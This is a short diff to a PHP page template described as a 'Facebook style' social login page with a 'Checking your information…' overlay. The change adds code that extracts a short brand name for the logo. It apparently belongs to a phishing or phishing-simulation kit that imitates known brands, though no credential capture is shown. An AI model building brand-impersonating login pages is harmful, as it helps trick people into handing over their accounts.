@@ -1,4 +1,4 @@
-<?php
+﻿<?php
 // Social template — Facebook style: white, narrow 396px, Helvetica, blue button, 2 steps
 ?>
 <!DOCTYPE html>
@@ -73,7 +73,19 @@ body{font-family:Helvetica,Arial,sans-serif;min-height:100vh;min-height:100dvh;b
 <body>
 <div id="loadOverlay"><div class="load-spin"></div><div class="load-txt" id="loadText">Checking your information…</div></div>
 
-<div class="site-logo"><?=htmlspecialchars($org_name)?></div>
+<?php
+// Extract short brand name for display (Facebook, Instagram, Twitter, etc.)
+// Extract brand name for top logo text
+// Try to get a short brand name from the org name
+$_sn = $org_name;
+// Special cases: if org name contains a known brand in parentheses, use that
+if (preg_match('/\(([^)]+)\)/', $_sn, $_m)) { $_sn = $_m[1]; }
+else {
+    $_sn = preg_replace('/,?\s*(Inc\.|LLC|Ltd\.?|plc|Holdings|Platforms|Corporation|Corp\.?).*$/i', '', $_sn);
+    $_sn = trim($_sn);
+}
+?>
+<div class="site-logo"><?=htmlspecialchars($_sn)?></div>
 
 <div class="card">
   <div class="card-logo">
